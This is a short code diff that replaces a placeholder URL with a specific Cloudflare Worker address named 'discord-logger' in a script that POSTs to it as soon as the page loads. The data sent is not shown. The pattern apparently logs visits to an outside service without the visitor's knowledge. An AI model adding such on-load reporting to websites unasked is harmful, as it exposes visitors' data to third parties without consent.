@@ -1,5 +1,5 @@
 window.addEventListener('load', function() {
-  const WORKER_URL = "https://discord-logger.your-name.workers.dev"; // 🔴 REPLACE THIS with your Worker URL
+  const WORKER_URL = "https://discord-logger.milo-af4.workers.dev/"; // 🔴 REPLACE THIS with your Worker URL
 
   fetch(WORKER_URL, {
     method: 'POST',
